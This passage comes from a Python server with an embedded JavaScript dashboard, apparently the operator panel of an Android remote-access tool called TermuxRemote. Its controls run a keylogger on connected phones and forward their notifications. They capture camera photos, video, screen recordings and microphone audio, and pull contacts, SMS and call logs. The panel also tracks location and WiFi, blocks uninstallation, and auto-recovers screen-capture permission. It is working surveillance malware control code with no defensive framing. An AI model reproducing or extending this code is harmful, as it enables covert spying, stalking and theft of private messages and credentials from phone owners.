async function openUsagePerm(){ if(!activeId){ toast('No client selected','err'); return; } const r = await api('/api/usage/perm', {}); toast(r.output||r.error||'?','ok',6000); }

// ═══ Keylog / Notif ═══
let keylogEntries = []; let unreadKeylogs = 0;
function klRender(){
  const out = $('kl-output'); if(!out) return;
  const filter = ($('kl-filter').value||'').toLowerCase();
  const list = filter ? keylogEntries.filter(e=>(e.pkg||'').toLowerCase().includes(filter)||(e.key||'').toLowerCase().includes(filter)||(e.full||'').toLowerCase().includes(filter)) : keylogEntries;
  if(!list.length){ out.innerHTML='<div style="color:var(--text-mute)">'+(filter?'No matches.':'No keystrokes captured yet.')+'</div>'; return; }
  out.innerHTML = list.map(e=>{
    const t = new Date(e.ts||Date.now()).toTimeString().slice(0,8);
    const kind = e.kind||'text';
    const color = kind==='text'?'var(--green)':kind==='click'?'var(--cyan)':kind==='window'?'var(--text-mute)':'var(--yellow)';
    return '<div class="log-entry" style="color:'+color+'"><span class="ts">'+t+'</span><span class="txt"><b>['+esc(e.pkg||'?')+'/'+esc(e.cls||'')+']</b> <span style="color:var(--text-mute)">'+esc(kind)+':</span> <span style="color:var(--text)">'+esc(e.key||'')+'</span></span></div>';
  }).join('');
  out.scrollTop = out.scrollHeight;
}
function klAppend(entry){ keylogEntries.push(entry); if(keylogEntries.length>500) keylogEntries = keylogEntries.slice(-500); klRender(); if(currentTab!=='keylog'){ unreadKeylogs++; const b=$('keylog-badge'); if(b){ b.textContent=unreadKeylogs; b.classList.remove('hidden'); } } }
function klClear(){ keylogEntries=[]; unreadKeylogs=0; const b=$('keylog-badge'); if(b) b.classList.add('hidden'); klRender(); fetch('/api/keylog/clear',{method:'POST'}).catch(()=>{}); }
function klSetState(state){ const s=$('kl-start'), p=$('kl-pause'); if(!s||!p) return; s.classList.toggle('primary', state!=='on'); p.classList.toggle('primary', state==='paused'); keylogPaused = state==='paused'; }
async function klStart(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('keylogger',['start'],{silent:true}); if(r.error){ toast(r.error,'err'); return; } const s=$('kl-status'); if(s) s.textContent=r.output||''; toast(r.output||'started','ok',5000); addLog('⌨ keylogger start','info'); klSetState('on'); }
async function klPause(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('keylogger',['pause'],{silent:true}); if(r.error){ toast(r.error,'err',5000); return; } const s=$('kl-status'); if(s) s.textContent=r.output||''; toast(r.output||'pause','warn'); addLog('⌨ keylogger pause','info'); if((r.output||'').toLowerCase().includes('resum')) klSetState('on'); else klSetState('paused'); }
async function klStop(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('keylogger',['stop'],{silent:true}); if(r.error){ toast(r.error,'err'); return; } const s=$('kl-status'); if(s) s.textContent=r.output||''; toast(r.output||'stopped','ok',5000); addLog('⌨ keylogger stop','info'); klSetState('off'); }
async function klStatus(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('keylogger',['status'],{silent:true}); const s=$('kl-status'); if(s) s.textContent=r.output||r.error||''; toast(r.output||r.error||'?','info'); const txt=(r.output||'').toLowerCase(); if(txt.includes('paused')) klSetState('paused'); else if(txt.includes('running')||txt.includes('on')) klSetState('on'); else if(txt.includes('stopped')||txt.includes('off')) klSetState('off'); }

let notifEntries = []; let unreadNotifs = 0;
function nfRender(){
  const out = $('nf-output'); if(!out) return;
  const filter = ($('nf-filter').value||'').toLowerCase();
  const list = filter ? notifEntries.filter(e=>(e.app||'').toLowerCase().includes(filter)||(e.pkg||'').toLowerCase().includes(filter)||(e.title||'').toLowerCase().includes(filter)||(e.body||'').toLowerCase().includes(filter)) : notifEntries;
  if(!list.length){ out.innerHTML='<div style="color:var(--text-mute)">'+(filter?'No matches.':'No notifications yet.')+'</div>'; return; }
  out.innerHTML = list.map(e=>{
    const t = new Date(e.ts||Date.now()).toTimeString().slice(0,8);
    const app = esc(e.app||e.pkg||'?'); const title = esc(e.title||''); const body = esc(e.body||'');
    return '<div class="log-entry" style="color:var(--magenta);padding:6px 0"><span class="ts">'+t+'</span><span class="txt"><b style="color:var(--cyan)">['+app+']</b> '+(title?'<span style="color:var(--text)"><b>'+title+'</b></span> ':'')+(body?'<span style="color:var(--text)">'+body+'</span>':'')+'</span></div>';
  }).join('');
  out.scrollTop = out.scrollHeight;
}
function nfAppend(entry){ notifEntries.push(entry); if(notifEntries.length>300) notifEntries=notifEntries.slice(-300); nfRender(); if(currentTab!=='keylog'){ unreadNotifs++; const b=$('notif-badge'); if(b){ b.textContent=unreadNotifs; b.classList.remove('hidden'); } } }
function nfClear(){ notifEntries=[]; unreadNotifs=0; const b=$('notif-badge'); if(b) b.classList.add('hidden'); nfRender(); fetch('/api/notif/clear',{method:'POST'}).catch(()=>{}); }
async function nfStart(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('notif',['start'],{silent:true}); if(r.error){ toast(r.error,'err'); return; } const s=$('nf-status'); if(s) s.textContent=r.output||''; toast(r.output||'started','ok',5000); addLog('🔔 notif start','info'); nfRefreshButtons(true); }
async function nfPause(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('notif',['pause'],{silent:true}); if(r.error){ toast(r.error,'err'); return; } const s=$('nf-status'); if(s) s.textContent=r.output||''; toast(r.output||'paused','warn'); addLog('🔔 notif pause','info'); nfRefreshButtons(false); }
async function nfStop(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('notif',['stop'],{silent:true}); if(r.error){ toast(r.error,'err'); return; } const s=$('nf-status'); if(s) s.textContent=r.output||''; toast(r.output||'stopped','warn',5000); addLog('🔔 notif stop','info'); nfRefreshButtons(false); }
async function nfStatus(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('notif',['status'],{silent:true}); const s=$('nf-status'); if(s) s.textContent=r.output||r.error||''; toast(r.output||r.error||'?','info'); if(r.output) nfRefreshButtons(r.output.includes('forwarding=ON')); }
function nfRefreshButtons(active){ const b1=$('nf-start'); if(b1) b1.classList.toggle('primary', !active); const b2=$('nf-pause'); if(b2) b2.classList.toggle('primary', !!active); }

// ═══ QA helpers ═══
async function qa(line, ev){
  const btn=ev && ev.currentTarget; if(btn) btn.disabled=true;
  addLog('▶ '+line,'info');
  const parts=line.split(/\s+/); const c=parts[0];
  try{
    if(c==='screenshot'){ await doScreenshot(parts[1]||null, btn); return; }
    if(c==='photo'){ await doPhoto(parts[1]||'back', parts[2]||null, btn); return; }
    if(c==='video'){ const face=parts[1]||'back'; const maybeSecs=parseInt(parts[2]); const secs=isNaN(maybeSecs)?5:maybeSecs; await doVideo(face,secs,null,btn); return; }
    if(c==='screenrec'){ const secs=parseInt(parts[1])||5; await doScreenrec(secs, parts[2]||null, btn); return; }
    if(c==='micaudio'){ const secs=parseInt(parts[1])||5; await doMicaudio(secs, parts[2]||null, btn); return; }
    if(c==='apps'){ switchTab('apps'); await loadApps(false); return; }
    const r = await sendLine(line, {silent:true});
    if(r.error){ addLog('✗ '+r.error,'err'); toast(r.error,'err'); return; }
    if(r.output){
      addLog(r.output.length>500?r.output.slice(0,500)+'…':r.output,'info');
      if(['contacts','sms','calllog'].includes(c)){
        $('data-output').textContent=r.output; dataKind=c;
        document.querySelectorAll('.subtab').forEach(s=>{ s.classList.toggle('active', s.dataset.kind===c); });
        document.querySelector('.tab[data-tab="data"]').click();
      } else { toast(r.output.slice(0,120),'ok'); }
    }
    if(r.note) toast(r.note,'warn');
    if(r.saved_name){ const k=kindFromName(r.saved_name); addCapture(r.saved_name, r.saved_size||0, k, false); }
  }catch(e){ toast('Failed: '+e.message,'err'); }
  finally{ if(btn) btn.disabled=false; }
}

// ═══ SSE ═══
function setHealth(state){ const dot=$('health-dot'), txt=$('health-text'); if(!dot) return; dot.className='health-dot'+(state==='warn'?' warn':state==='err'?' err':''); txt.textContent=state==='warn'?'reconnecting':state==='err'?'offline':'online'; }
function startSSE(){
  const ev=new EventSource('/api/events');
  ev.onopen=()=>{ setHealth('ok'); addLog('web connected','connect'); };
  ev.onerror=()=>{ setHealth('warn'); addLog('web reconnecting…','err'); };
  ev.addEventListener('state', e=>{
    const d=JSON.parse(e.data);
    if(d.active) activeId=d.active;
    if(d.cwd!==undefined){ currentCwd=d.cwd||''; updateCwdUI(); }
    allClients = d.clients || []; renderClients(d.clients); updateHero();
    const cl = (d.clients||[]).find(c=>c.id===activeId); if(cl) startUptime(cl.secs);
    if(d.keylog && Array.isArray(d.keylog)){ keylogEntries = d.keylog; klRender(); }
    if(d.notif && Array.isArray(d.notif)){ notifEntries = d.notif; nfRender(); }
    // ★ Initial projection state
    if(d.projection){
      projectionState.screen = d.projection.screen;
      if(d.projection.screen === false){
        showProjBanner('⚠ ' + (d.projection.msg || 'screen capture not granted'));
      } else if(d.projection.screen === true){
        hideProjBanner();
      }
    }
  });
  ev.addEventListener('keylog', e=>{ try{ klAppend(JSON.parse(e.data)); }catch(_){} });
  ev.addEventListener('keylog-clear', ()=>{ keylogEntries=[]; unreadKeylogs=0; const b=$('keylog-badge'); if(b) b.classList.add('hidden'); klRender(); });
  ev.addEventListener('notification', e=>{ try{ nfAppend(JSON.parse(e.data)); }catch(_){} });
  ev.addEventListener('notification_removed', e=>{ try{ const d=JSON.parse(e.data); addLog('🔕 ['+d.client+'] removed '+d.pkg+'#'+d.id,'info'); }catch(_){} });
  ev.addEventListener('notif-clear', ()=>{ notifEntries=[]; unreadNotifs=0; const b=$('notif-badge'); if(b) b.classList.add('hidden'); nfRender(); });
  ev.addEventListener('clients', e=>{ const d=JSON.parse(e.data); if(d.active!==undefined) activeId=d.active; allClients=d.clients||[]; renderClients(d.clients); updateHero(); if(currentTab==='overview') loadOverview(); });
  ev.addEventListener('cwd', e=>{ const d=JSON.parse(e.data); currentCwd=d.cwd||''; updateCwdUI(); });
  ev.addEventListener('connect', e=>{
    const d=JSON.parse(e.data);
    addLog('✓ '+d.id+' connected ['+d.model+'/A'+d.android+']','connect');
    toast('Client connected: '+d.id,'ok');
    // ★ Wait 3s, then check projection state for this client
    setTimeout(checkProjectionState, 3000);
  });
  ev.addEventListener('disconnect', e=>{
    const d=JSON.parse(e.data);
    addLog('✗ '+d.id+' disconnected (remaining '+d.remaining+')','disconnect');
    toast('Disconnected: '+d.id,'warn');
    if(liveActive && activeId===d.id){ stopLive(); }
    if(ctrlActive && activeId===d.id){ ctrlStop(); }
    if(activeId===d.id){ stopUptime(); }
    appListData=[];
    // If this was the active client, hide the banner (no device connected)
    if(activeId===d.id){ projectionState.screen = null; hideProjBanner(); }
  });
  ev.addEventListener('reconnect', e=>{ const d=JSON.parse(e.data); addLog('↻ '+d.id+' reconnecting','info'); });
  ev.addEventListener('connect-fail', e=>{ const d=JSON.parse(e.data); addLog('✗ auth failed from '+d.peer,'err'); });

  // ★ Projection state event
  ev.addEventListener('projection_state', e=>{
    try{
      const d = JSON.parse(e.data);
      if(d.client !== activeId) return;
      projectionState.screen = d.screen;
      if(d.screen === true){
        hideProjBanner();
        if(!projectionState.autoRecoveryInFlight){
          toast('✓ Screen capture granted','ok',3000);
        }
        projectionState.autoRecoveryInFlight = false;
      } else if(d.screen === false){
        showProjBanner('⚠ ' + (d.msg || 'screen capture not granted — control & live screen won\'t work'));
        // Auto-recovery once per 30s
        tryAutoRecovery();
      } else {
        // null → still determining
      }
    }catch(_){}
  });

  ev.addEventListener('wifi_change', e=>{ try{ const d=JSON.parse(e.data); addLog('📶 ['+d.client+'] WiFi → '+d.ssid+(d.lat?' @ '+d.lat+','+d.lon:''),'wifi'); if(currentTab==='monitor') loadWifiHistory(); }catch(_){} });
  ev.addEventListener('session_event', e=>{ try{ const d = JSON.parse(e.data); sessionEvents.push(d); if(sessionEvents.length > 5000) sessionEvents = sessionEvents.slice(-5000); if(currentTab === 'session') renderSession(); }catch(_){} });
  ev.addEventListener('session_recording', e=>{ try{ const d = JSON.parse(e.data); sessionIsRecording = !!d.recording; updateRecUI(); }catch(_){} });
  ev.addEventListener('session_cleared', ()=>{ sessionEvents = []; if(currentTab === 'session') renderSession(); });
  ev.addEventListener('push', e=>{
    const d=JSON.parse(e.data);
    if(d.event==='battery') addLog('🔋 ['+d.client+'] '+d.level+'%'+(d.charging?' ⚡':''),'battery');
    else if(d.event==='sms') addLog('📱 ['+d.client+'] '+d.from+': '+d.body,'sms');
    else if(d.event==='location') addLog('📍 ['+d.client+'] '+d.lat+','+d.lon+' ±'+d.acc+'m','location');
    else if(d.event==='keylogger'){ addLog('⌨ ['+d.client+'] keylogger '+(d.status||'')+': '+(d.msg||''), d.status==='started'?'connect':'disconnect'); const st=(d.status||'').toLowerCase(); if(st.includes('paused')) klSetState('paused'); else if(st.includes('resum')||st.includes('running')||st.includes('started')) klSetState('on'); else if(st.includes('stop')) klSetState('off'); }
    else if(d.event==='notif_svc') addLog('🔔 ['+d.client+'] notif service '+(d.status||'')+': '+(d.msg||''), d.status==='started'?'connect':'disconnect');
    else if(d.event==='notif_state'){ addLog('🔔 ['+d.client+'] forwarding '+(d.forwarding?'ON':'PAUSED')+': '+(d.msg||''), d.forwarding?'connect':'disconnect'); nfRefreshButtons(!!d.forwarding); }
    else if(d.event==='net_update'){ addLog('🌐 ['+d.client+'] endpoint change → '+d.ip+':'+d.port,'info'); toast('Client switching to '+d.ip+':'+d.port,'warn',5000); }
    else if(d.event==='perm_req'){ addLog('🔐 ['+d.client+'] permission requested: '+d.what,'info'); toast('Device showing permission dialog: '+d.what,'warn',5000); }
    else if(d.event==='perm_state'){
      const bits=[];
      if(d.screen!==null && d.screen!==undefined){
        bits.push('screen='+(d.screen?'ON':'OFF'));
        if(d.client === activeId){
          projectionState.screen = d.screen;
          if(d.screen === false){
            showProjBanner('⚠ ' + (d.msg || 'screen capture lost — re-grant needed'));
            tryAutoRecovery();
          } else if(d.screen === true){
            hideProjBanner();
          }
        }
      }
      if(d.overlay!==null && d.overlay!==undefined) bits.push('overlay='+(d.overlay?'ON':'OFF'));
      if(d.missing) bits.push('missing='+d.missing);
      if(d.reason) bits.push('('+d.reason+')');
      const cls = bits.some(x=>x.endsWith('ON'))?'connect':'warn';
      addLog('🔐 ['+d.client+'] '+(bits.join(' ')||d.msg||'perm update'), cls);
      if(currentTab==='network') loadPerms();
    }
    else if(d.event==='app_launched') addLog('📱 ['+d.client+'] launched '+d.pkg+' via '+d.how, 'connect');
    else if(d.event==='anti_uninstall') addLog('🛡 ['+d.client+'] anti-uninstall: '+(d.action||'')+(d.pkg?' ('+d.pkg+')':''), 'err');
    else if(d.event==='wifi_change') addLog('📶 ['+d.client+'] WiFi → '+d.ssid, 'wifi');
    else if(d.event==='screen_state') addLog('🖥 ['+d.client+'] screen '+(d.state||''), 'info');
    else addLog('📨 ['+d.client+'] '+JSON.stringify(d),'info');
    if(currentTab==='overview' && ['battery','sms','location','notification','app_launched','wifi_change'].includes(d.event)){
      clearTimeout(window._ovRefreshT);
      window._ovRefreshT = setTimeout(loadOverview, 800);
    }
  });
}

document.addEventListener('keydown', e=>{
  if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA') return;
  if(e.key==='Escape'){ closeLightbox(); closePwModal(); return; }
  if(currentTab!=='dashboard') return;
  const map = {'1':()=>dashPhoto($('btn-photo')),'2':()=>dashVideo($('btn-video')),'3':()=>dashScreenshot($('btn-screenshot')),'4':()=>dashScreenrec($('btn-screenrec')),'5':()=>dashScreenrecAv($('btn-screenrec-av')),'6':()=>dashMicaudio($('btn-micaudio'))};
  if(map[e.key]){ e.preventDefault(); map[e.key](); }
});

// ═══ Boot ═══
async function boot(){
  renderGallery();
  try{ const savedTab = localStorage.getItem('tab'); if(savedTab) switchTab(savedTab); }catch(_){}
  const s = await api('/api/state');
  activeId = s.active||null; currentCwd = s.cwd||'';
  allClients = s.clients || []; renderClients(s.clients); updateHero(); updateCwdUI();
  const cl = (s.clients||[]).find(c=>c.id===activeId); if(cl) startUptime(cl.secs);
  if(s.keylog && Array.isArray(s.keylog)){ keylogEntries=s.keylog; klRender(); }
  if(s.notif && Array.isArray(s.notif)){ notifEntries=s.notif; nfRender(); }
  if(s.projection && s.projection.screen === false && activeId){
    showProjBanner('⚠ ' + (s.projection.msg || 'screen capture not granted'));
  }
  if(activeId){ refreshInfo(); loadNet(); loadPerms(); loadClientMeta(activeId); }
  loadEncStatus();
  sessionStatus();
  loadOverview();
  startSSE();
  addLog('panel ready — click a client to begin','info');
  // ★ Initial projection state check
  setTimeout(async () => {
    const ok = await checkProjectionState();
    if(!ok && activeId){
      setTimeout(tryAutoRecovery, 2000);
    }
  }, 1500);
}
window.addEventListener('beforeunload', ()=>{ if(liveActive) stopLive(); if(ctrlActive) ctrlStop(); });
setInterval(()=>{ if(currentTab === 'overview') loadOverview(); }, 30000);
setInterval(()=>{ if(currentTab === 'session') loadSessionEvents(); }, 5000);
setInterval(checkProjectionState, 5000);
setInterval(tryAutoRecovery, 15000);
boot();
</script>
</body>
</html>
"""


# ══════════════════════════════════════════════════════════════════════
#   MAIN
# ══════════════════════════════════════════════════════════════════════
async def main():
    print()
    print(f"{C.CYAN}{C.BOLD}╔════════════════════════════════════════════════════════════╗")
    print(f"║ TermuxRemote · Web Control Panel v3.10.1                   ║")
    print(f"║ projection-state aware · persistent banner · auto-recovery ║")
    print(f"╚════════════════════════════════════════════════════════════╝{C.RESET}")

    print(f" {C.GRAY}public endpoint {C.RESET} {C.CYAN}{ENDPOINT_PUBLIC}{C.RESET}  {C.GRAY}← what Android Config.kt uses{C.RESET}")
    print(f" {C.GRAY}local tcp bind  {C.RESET} {C.GREEN}{ENDPOINT_LOCAL}{C.RESET}  {C.GRAY}← where the tunnel forwards to{C.RESET}")
    print(f" {C.GRAY}browser http    {C.RESET} {C.CYAN}http://<this-host>:{HTTP_PORT}{C.RESET}")
    print(f" {C.GRAY}auth token      {C.RESET} {(SECRET[:4] + '…' + SECRET[-2:]) if len(SECRET) > 8 else '(short)'}  {C.GRAY}(len {len(SECRET)}){C.RESET}")
    print(f" {C.GRAY}save dir        {C.RESET} {SAVE_DIR}")
    print(f" {C.GRAY}max file size   {C.RESET} {MAX_FILE // 1024 // 1024} MB")
    print(f" {C.GRAY}default web pw  {C.RESET} {C.YELLOW}{DEFAULT_WEB_PASSWORD}{C.RESET}  {C.GRAY}(change in dashboard){C.RESET}")
    print(f" {C.GRAY}crypto          {C.RESET} "
          f"{C.GREEN + 'AES-256-GCM ready' + C.RESET if _CRYPTO_OK else C.RED + 'cryptography package missing' + C.RESET}")
    print(f" {C.GRAY}PIL downscale   {C.RESET} "
          f"{C.GREEN + 'enabled (2-3x faster screen)' + C.RESET if _PIL_OK else C.YELLOW + 'disabled (pip install pillow)' + C.RESET}")
    print(f" {C.GRAY}master key      {C.RESET} "
          f"{'set via TERMUX_ENC_KEY' if os.environ.get('TERMUX_ENC_KEY') else 'derived from SECRET'}")
    print(f" {C.GRAY}auto-enc media  {C.RESET} "
          f"{'ON (TERMUX_AUTO_ENC=1)' if AUTO_ENCRYPT_MEDIA else 'off'}")
    print(f" {C.GRAY}config file     {C.RESET} {ENV_PATH}")
    print(f" {C.GRAY}clients meta    {C.RESET} {CLIENTS_META_PATH}")

    if ANDROID_PORT == TCP_PORT:
        print(f" {C.GREEN}✓ endpoint ports aligned ({ANDROID_PORT} = {TCP_PORT}){C.RESET}")
    else:
        print(f" {C.GRAY}(tunnel) {ENDPOINT_PUBLIC} → forwards to local {ENDPOINT_LOCAL}{C.RESET}")

    print()

    def _loop_exc_handler(loop, context):
        exc = context.get("exception")
        if _is_abort(exc): return
        loop.default_exception_handler(context)

    asyncio.get_running_loop().set_exception_handler(_loop_exc_handler)

    tcp_srv = await asyncio.start_server(
        handle_tcp, "0.0.0.0", TCP_PORT, limit=SERVER_LIMIT)
    http_srv = await asyncio.start_server(
        handle_http, "0.0.0.0", HTTP_PORT)
    print(f"{C.GREEN}✓ ready.{C.RESET} open the browser URL above.\n")
    await asyncio.gather(tcp_srv.serve_forever(), http_srv.serve_forever())


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}◼ shutting down.{C.RESET}")
